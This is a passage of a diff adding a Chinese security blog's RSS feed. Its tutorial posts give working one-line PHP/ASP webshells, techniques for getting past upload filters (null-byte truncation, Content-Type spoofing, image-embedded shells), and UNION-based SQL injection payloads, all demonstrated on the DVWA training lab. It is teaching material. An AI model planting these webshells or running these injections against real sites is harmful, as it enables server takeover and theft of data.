+&lt;pre&gt;&lt;code class=&#34;language-asp&#34; data-lang=&#34;asp&#34;&gt;&amp;lt;%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;aspx:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-asp&#34; data-lang=&#34;asp&#34;&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot;%&amp;gt;&amp;lt;%eval(Request.Item[&amp;quot;pass&amp;quot;],&amp;quot;unsafe&amp;quot;);%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;php:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其中，pass是这个木马中的密码的值，也可以替换为其他字符。&lt;/p&gt;
+&lt;h2 id=&#34;3-一句话木马运作方式&#34;&gt;3. 一句话木马运作方式&lt;/h2&gt;
+&lt;p&gt;首先，可以把这个一句话木马插入到一个正常的网站文件中，asp的插入到asp文件里，php的插入到php文件里，其他同理。也可以把木马单独写在一个文件里，比如新建一个php文件，整个php文件内容就只有这一句话。&lt;/p&gt;
+&lt;p&gt;插入的方法，一般来讲是通过文件上传功能，如作业上传网站、图片上传网站，将木马文件上传到目标网站的服务器 中，再将文件存储的链接添加到菜刀中，输入木马的密码即可直接拿到服务器的控制权。&lt;/p&gt;
+&lt;h2 id=&#34;4-简单的例子&#34;&gt;4. 简单的例子&lt;/h2&gt;
+&lt;h3 id=&#34;编写php木马&#34;&gt;编写php木马&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xxt&amp;#39;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将该php文件命名为 【xxt.php】&lt;/p&gt;
+&lt;h3 id=&#34;降低dvwa安全标准&#34;&gt;降低DVWA安全标准&lt;/h3&gt;
+&lt;p&gt;因为这里主要是介绍菜刀的连接方式，为了简便使用没有防备的上传点。&lt;/p&gt;
+&lt;p&gt;在DVWA漏洞训练平台中，登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择 File Upload, 进入页面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic3.zhimg.com/80/v2-381443d25db71eac8b4694a43e87bd7a_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;上传php木马&#34;&gt;上传php木马&lt;/h3&gt;
+&lt;p&gt;浏览文件，选择【xxt.php】，点击 Upload 上传。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic3.zhimg.com/80/v2-dd7586fe7d712c460bf4c0258a16a61a_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上传成功，显示了文件的保存路径。前两个省略号是指父级目录，因此文件的绝对路径为&lt;/p&gt;
+&lt;p&gt;
+&lt;a href=&#34;https://link.zhihu.com/?target=http%3A//127.0.0.1/dvwa-master/hackable/uploads/xxt.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://127.0.0.1/dvwa-master/hackable/uploads/xxt.php&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;菜刀连接&#34;&gt;菜刀连接&lt;/h3&gt;
+&lt;p&gt;打开菜刀，右键—&amp;gt; 添加—&amp;gt;输入绝对路径和密码—&amp;gt;添加&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic3.zhimg.com/80/v2-2ad1a31cafac7f0f47871bb86d5e272a_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-92e754f28b20e5950617bb7586926030_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最上方的就是我们刚添加的后门路径，双击即可查看服务器文件夹，并对其操作&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic2.zhimg.com/80/v2-e909f9b64f937d6ca2abdf188a6a8135_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;因为这个DVWA平台是在我的本地服务器搭的，所以这里的服务器就是我自己的电脑啦&lt;/p&gt;
+&lt;h1 id=&#34;0x02-文件上传防御策略&#34;&gt;0x02 文件上传防御策略&lt;/h1&gt;
+&lt;h2 id=&#34;1--常见防御策略&#34;&gt;1.  常见防御策略&lt;/h2&gt;
+&lt;p&gt;在一般的网站中，是不可能直接让你上传木马文件的，都要对上传进行过滤。&lt;/p&gt;
+&lt;p&gt;通常会有文件类型限制、文件大小限制等过滤方式。文件类型限制最为常见，一般有&lt;strong&gt;前台文件扩展名检测&lt;/strong&gt;、&lt;strong&gt;服务器端扩展名检测&lt;/strong&gt;、&lt;strong&gt;content-type 参数检测&lt;/strong&gt;或&lt;strong&gt;文件内容检测&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;前台脚本检测扩展名&#34;&gt;前台脚本检测扩展名&lt;/h3&gt;
+&lt;p&gt;当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。&lt;/p&gt;
+&lt;h3 id=&#34;content-type文件类型检测&#34;&gt;Content-Type文件类型检测&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Content-Type&lt;/strong&gt;，内容类型，是网页请求中附带的参数，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，这就是经常看到一些Asp网页点击的结果却是下载到的一个文件或一张图片的原因。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ContentType&lt;/strong&gt; 一般参数有&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;application/x-cdf 应用型文件&lt;/li&gt;
+&lt;li&gt;text/HTML 文本&lt;/li&gt;
+&lt;li&gt;image/JPEG jpg 图片&lt;/li&gt;
+&lt;li&gt;image/GIF gif图片&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;当浏览器在上传文件到服务器的时候，服务器对说上传文件的 Content-Type 类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。绕过 Content—Type 文件类型检测，就是用 BurpSuite 截取并修改数据包中文件的 Content-Type 类型，使其符合白名单的规则，达到上传的目的。&lt;/p&gt;
+&lt;h3 id=&#34;服务器端扩展名检测&#34;&gt;服务器端扩展名检测&lt;/h3&gt;
+&lt;p&gt;当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。&lt;/p&gt;
+&lt;h3 id=&#34;文件内容检测&#34;&gt;文件内容检测&lt;/h3&gt;
+&lt;p&gt;一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。所以经常要将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接。&lt;/p&gt;
+&lt;h1 id=&#34;0x03-绕过检测上传&#34;&gt;0x03 绕过检测上传&lt;/h1&gt;
+&lt;h2 id=&#34;1-利用00截断上传绕过前台检测&#34;&gt;1. 利用00截断上传绕过前台检测&lt;/h2&gt;
+&lt;p&gt;比如某网站的上传点采用了前端扩展名检测，只允许上传图片文件，而我们要上传一个php木马，可以按照以下步骤&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;php木马伪装jpg文件&lt;/p&gt;
+&lt;p&gt;先编写一个一句话木马，命名为【lubr.php.jpg】，因为扩展名检测是从文件名的右边往左读的，当读到第一个【. 】的时候，便通过扩展名确定这个文件的类型。这里就将 php 文件伪装成了jpg 文件。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;BurpSuite拦截改2e为00&lt;/p&gt;
+&lt;p&gt;开启 BurpSuite 的【proxy】 功能，在选择 【lubr.php.jpg】 文件后，点击上传。&lt;/p&gt;
+&lt;p&gt;这时上传文件的数据包不会直接发往服务器，而是要经由 Burp 来发送，我们在这里可以查看和修改数据包的内容。&lt;/p&gt;
+&lt;p&gt;点击hex查看十六进制源码，如下图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-7af67370ae3ba0e72478a6f9d9c190b4_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到 lubr.php.jpg 对应的源码，将 lubr.php 后的【.】 对应的【2e】改为【00】&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic2.zhimg.com/80/v2-38ab35d43d6572a7c8065e43573f6465_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;【00】对应【空】 ,注意【空格Space】不等于【空】&lt;/p&gt;
+&lt;p&gt;点击 【forward】，即可成功上传文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;菜刀连接&lt;/p&gt;
+&lt;p&gt;获取php木马的绝对路径，略&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;2-截断改扩展名绕过前台检测&#34;&gt;2. 截断改扩展名绕过前台检测&lt;/h2&gt;
+&lt;p&gt;与00截断类似，此方法也是通过截断数据包做修改来实现的。&lt;/p&gt;
+&lt;p&gt;如果直接上传php文件，会被拦截。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic2.zhimg.com/80/v2-9ca0771bd3632f20b6d58d08cba476ed_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;准备一句话木马&lt;/p&gt;
+&lt;p&gt;先写一个php一句话木马，然后在这里命名为 lubr.jpg，而不是php文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;BurpSuite拦截改扩展名&lt;/p&gt;
+&lt;p&gt;在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件后缀名由【.jpg】改为【.php】&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-b816c41f5bbf6b72037452111bf22c6c_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功&lt;/p&gt;
+&lt;p&gt;​	略&lt;/p&gt;
+&lt;h2 id=&#34;3--绕过content-type检测文件类型上传&#34;&gt;3.  绕过Content-Type检测文件类型上传&lt;/h2&gt;
+&lt;p&gt;Content-Type如果为【application/octet-stream】，这一般是可运行程序（木马）的类型，因此会拒绝上传。但如果我们将其改为【image/gif】图片类型，可能就能够绕过该检测。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;BurpSuite拦截改Content-Type参数&lt;/p&gt;
+&lt;p&gt;在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件的Content-Type由【application/octet-stream】改为【image/gif】&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;​	&lt;img src=&#34;https://pic4.zhimg.com/80/v2-a92474b3bab37ace1d80ba8bb66725f7_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功&lt;/p&gt;
+&lt;p&gt;​	略&lt;/p&gt;
+&lt;h2 id=&#34;4-apache解析漏洞上传shell绕过服务器端扩展名检测&#34;&gt;4. apache解析漏洞上传shell绕过服务器端扩展名检测&lt;/h2&gt;
+&lt;p&gt;Apache 识别文件类型是从右向左识别的，如果如遇不认识的扩展名会向前一次识别，直到遇到能识别的扩展名**，**因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。这种漏洞存在于使用module模式与php结合的所有版本的Apache。&lt;/p&gt;
+&lt;p&gt;假如某网站刚好使用了有解析漏洞版本的Apache，而且其对服务器端对【.php】文件直接上传做了过滤。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;一句话木马&lt;/p&gt;
+&lt;p&gt;因为服务器端对【.php】上传做了过滤，因此无论怎么用BurpSuite修改都不能上传成功。&lt;/p&gt;
+&lt;p&gt;如果将该木马命名为 【lubr.php.adc】，则显示上传成功。&lt;/p&gt;
+&lt;p&gt;因为服务器端黑名单只限制了几种扩展名的上传，而其他扩展名都是合法的，不论这种扩展名是否有效，而apache却能识别无效的扩展名并不予解析，这种不对称的扩展名识别造成了上传漏洞的产生。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;菜刀连接&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-38cc75e063bd49751e267408dac2d338_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	菜刀也不识别【.abc】，直接解析【.php】，连接成功。&lt;/p&gt;
+&lt;h2 id=&#34;5-构造图片马绕过文件内容检测&#34;&gt;5. 构造图片马绕过文件内容检测&lt;/h2&gt;
+&lt;p&gt;文件内容检测脚本中getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错，是一种比较严的防御措施。但并不代表其牢不可破。&lt;/p&gt;
+&lt;p&gt;虽然php内容不合法，但我们可以将其伪装成一个图片，以欺骗检测脚本来进行非法上传。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;构造图片马&lt;/p&gt;
+&lt;p&gt;随便找一个图片，将其与要上传的木马置于同一文件夹下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic2.zhimg.com/80/v2-a69e2e5d62aec6c57280a760497d80f1_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;打开cmd，进入该文件夹，输入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;copy doram.jpg/b+lubr.php/a xiaoma.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将【lubr.php】插入到【doram.jpg】中。其中【xiaoma.jpg】是插入后的文件。&lt;/p&gt;
+&lt;p&gt;用记事本打开【xiaoma.jpg】，发现木马插入到了文件最后。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic4.zhimg.com/80/v2-551a4bca6c9b4744dccf6cc662ff533f_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;上传木马&lt;/p&gt;
+&lt;p&gt;将文件名改为【xiaoma.jpg.php】，然后上传成功，菜刀连接。&lt;/p&gt;
+&lt;p&gt;以上就是几种检测情况的绕过方法，真实情况下需各种方式配合使用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>DVWA的SQL注入测试</title>
+      <link>https://p0st3r.github.io/post/dvwa-sql-injection-test/</link>
+      <pubDate>Thu, 09 Feb 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/dvwa-sql-injection-test/</guid>
+      <description>&lt;p&gt;SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。&lt;/p&gt;
+&lt;p&gt;具体来说，它是利用现有的应用出现，将（恶意）的SQL目录注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。&lt;/p&gt;
+&lt;h1 id=&#34;步骤&#34;&gt;步骤&lt;/h1&gt;
+&lt;h2 id=&#34;低安全等级文件包含&#34;&gt;低安全等级文件包含&lt;/h2&gt;
+&lt;h3 id=&#34;登陆dvwa&#34;&gt;登陆DVWA&lt;/h3&gt;
+&lt;p&gt;使用浏览器打开``,输入用户名密码登陆。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_45413&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;调整安全级别&#34;&gt;调整安全级别&lt;/h3&gt;
+&lt;p&gt;登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择SQL Injection，进入页面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_48342&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;简单的id查询&#34;&gt;简单的ID查询&lt;/h3&gt;
+&lt;p&gt;提示输入User ID，输入正确的ID，将显示ID First name，Surname信息。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_64727&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;检测是否存在注入&#34;&gt;检测是否存在注入&lt;/h3&gt;
+&lt;p&gt;可以得知此处位注入点，尝试输入&lt;code&gt;&#39;&lt;/code&gt;，返回错误。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_58203&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;遍历数据库表&#34;&gt;遍历数据库表&lt;/h3&gt;
+&lt;p&gt;尝试遍历数据库表，提示输入的值是ID，可以初步判断此处为数字类型的注入。尝试输入&lt;code&gt;1 or 1=1&lt;/code&gt;，尝试遍历数据库表。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_24591&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可见并没有达成目的，猜测程序将此处看成了字符型，尝试输入&lt;code&gt;1&#39; or&#39; 1&#39; =&#39; 1&lt;/code&gt;后遍历出了数据库中所有内容。下面尝试不同语句，得到不同的结果。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_87635&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查询信息列表长度&#34;&gt;查询信息列表长度&lt;/h3&gt;
+&lt;p&gt;利用&lt;code&gt;order by [num]&lt;/code&gt;语句来测试查询信息列表长度，修改num的值,这里我们输入&lt;code&gt;1&#39; order by 1 --&lt;/code&gt;结果页面正常显示，&lt;strong&gt;注意–后面有空格&lt;/strong&gt;。继续测试，&lt;code&gt;1&#39; order by 2 --&lt;/code&gt;，&lt;code&gt;1&#39; order by 3 --&lt;/code&gt;，当输入3时，页面报错。页面错误信息如下：&lt;code&gt;Unknown column &#39;3&#39; in &#39;order clause&#39;&lt;/code&gt;，由此我们判断查询结果值为2列。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_15397&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;获取数据库名称账户名版本及操作系统信息&#34;&gt;获取数据库名称、账户名、版本及操作系统信息&lt;/h3&gt;
+&lt;p&gt;通过使用&lt;code&gt;user()&lt;/code&gt;，&lt;code&gt;database()&lt;/code&gt;，&lt;code&gt;version()&lt;/code&gt;三个内置函数得到连接数据库的账户名、数据库名称、数据库版本信息。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;首先参数注入&lt;code&gt;1&#39; and 1=2 union select 1,2 --&lt;/code&gt;(&lt;strong&gt;注意–后有空格&lt;/strong&gt;)。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_23692&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;由上图得知，First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过注入&lt;code&gt;1&#39; and 1=2 union select user(),database() --&lt;/code&gt;得到数据库用户为&lt;strong&gt;root@localhost&lt;/strong&gt;及数据库名&lt;strong&gt;dvwa&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_62655&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过注入&lt;code&gt;1&#39; and 1=2 union select version(),database() --&lt;/code&gt;得到数据库版本信息，此处数据库版本为&lt;strong&gt;5.0.90-community-nt&lt;/strong&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_83473&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过注入&lt;code&gt;1&#39; and 1=2 union select 1,@@global.version_compile_os from mysql.user --&lt;/code&gt;获得操作系统信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_94423&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查询mysql数据库所有数据库及表&#34;&gt;查询mysql数据库所有数据库及表&lt;/h3&gt;
+&lt;p&gt;通过注入&lt;code&gt;1&#39; and 1=2 union select 1,schema_name from information_schema.schemata --&lt;/code&gt;查询mysql数据库的所有数据库名。&lt;/p&gt;
+&lt;p&gt;这里利用mysql默认的数据库&lt;strong&gt;information_schema&lt;/strong&gt;，该数据库存储了Mysql所以数据库和表的信息。如图所示&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_21763&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;猜解表名&#34;&gt;猜解表名&lt;/h3&gt;
+&lt;p&gt;通过注入&lt;code&gt;1&#39; and exists(select * from users) --&lt;/code&gt;猜解dvwa数据库中的表名。&lt;/p&gt;
+&lt;p&gt;利用&lt;code&gt;1&#39; and exists(select * from [表名])&lt;/code&gt;，这里测试的结果，表名为users，在真实的渗透环境中，攻击者往往关心存储管理员用户和密码信息的表。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_36450&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;猜解字段名&#34;&gt;猜解字段名&lt;/h3&gt;
+&lt;p&gt;猜解字段名：&lt;code&gt;1&#39; and exists(select [表名] from users) --&lt;/code&gt;。这里测试的字段名有&lt;code&gt;first_name&lt;/code&gt;,&lt;code&gt;last_name&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;通过注入&lt;code&gt;1&#39; and exists(select first_name from users) --&lt;/code&gt;和&lt;code&gt;1&#39; and exists(select last_name from users) --&lt;/code&gt;猜解字段名。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_21940&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;爆出数据库中字段内容&#34;&gt;爆出数据库中字段内容&lt;/h3&gt;
+&lt;p&gt;注入&lt;code&gt;1&#39; and 1=2 union select first_name,last_name from users --&lt;/code&gt;，这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_94412&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;代码分析&#34;&gt;代码分析&lt;/h2&gt;
+&lt;h3 id=&#34;low等级源代码&#34;&gt;low等级源代码&lt;/h3&gt;
+&lt;p&gt;如图所示&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_37330&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过代码可以看出，对输入&lt;strong&gt;$id&lt;/strong&gt;的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。&lt;/p&gt;
+&lt;h3 id=&#34;中等等级代码分析&#34;&gt;中等等级代码分析&lt;/h3&gt;
+&lt;p&gt;将DVWA安全级别调整位medium，查看源代码。&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_95600&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过源代码可以看出，在中等级别时对输入的&lt;strong&gt;$id&lt;/strong&gt;值使用&lt;code&gt;mysql_real_eascape_string()&lt;/code&gt;函数进行了处理。在PHP中，使用&lt;code&gt;mysql_real_eascape_string()&lt;/code&gt;函数用来转移SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字转换一下编码格式即可绕过该防护函数。比如URL编码等方式。&lt;/p&gt;
+&lt;p&gt;同时发现SQL语句中变成了&lt;code&gt;“WHRER user_id = “$id”&lt;/code&gt; ，此处变成了数字型注入，所以此处使用&lt;code&gt;mysql_real_eascape_string()&lt;/code&gt;函数并没有起到防护作用。可以通过类似于&lt;code&gt;1 or 1=1&lt;/code&gt;的语句来进行注入。&lt;/p&gt;
+&lt;h3 id=&#34;高等级代码分析&#34;&gt;高等级代码分析&lt;/h3&gt;
+&lt;p&gt;将DVWA安全级别调整为high，查看源代码。&lt;img src=&#34;http://www.shiyanbar.com/UploadImage/2016/3/7/20_75240&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;从源代码可以看出，此处为字符型注入。对传入&lt;strong&gt;$id&lt;/strong&gt;的值使用&lt;code&gt;stripslashes()&lt;/code&gt;函数处理以后，再经过到&lt;code&gt;$mysql_real_escape_string()&lt;/code&gt;函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行&lt;code&gt;addslashes()&lt;/code&gt;,&lt;code&gt;addslashes()&lt;/code&gt;函数返回在部分与定义之前添加&lt;code&gt;\&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Striptslashes()&lt;/code&gt;函数则是删除由&lt;code&gt;addslashes()&lt;/code&gt;函数添加的反斜杠。在使用两个函数进行过滤之后再使用&lt;code&gt;is_numric()&lt;/code&gt;函数检查&lt;strong&gt;$id&lt;/strong&gt;值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>基于KVM架构的VPS服务器搭建ss及锐速优化教程</title>
+      <link>https://p0st3r.github.io/post/kvm-vps-ss-rs/</link>
+      <pubDate>Tue, 25 Oct 2016 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/kvm-vps-ss-rs/</guid>
+      <description>&lt;h1 id=&#34;准备&#34;&gt;准备&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;KVM架构虚拟服务器&lt;/li&gt;
+&lt;li&gt;xshell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;服务器&#34;&gt;服务器&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;任意一家运营商的KVM架构VPS服务器&lt;/li&gt;
+&lt;li&gt;Ubuntu 14.04 64bit系统&lt;/li&gt;
+&lt;li&gt;运行&lt;code&gt;apt-get install vim&lt;/code&gt; 安装vim&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;搭建shadowsocks环境&#34;&gt;搭建shadowsocks环境&lt;/h1&gt;
+&lt;p&gt;使用&lt;code&gt;xshell&lt;/code&gt;连接服务器主机&lt;/p&gt;
+&lt;h2 id=&#34;安装shadowsocks服务端&#34;&gt;安装shadowsocks服务端&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;apt-get install python-pip
+pip install shadowsocks
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;配置shadowsocks&#34;&gt;配置shadowsocks&lt;/h2&gt;
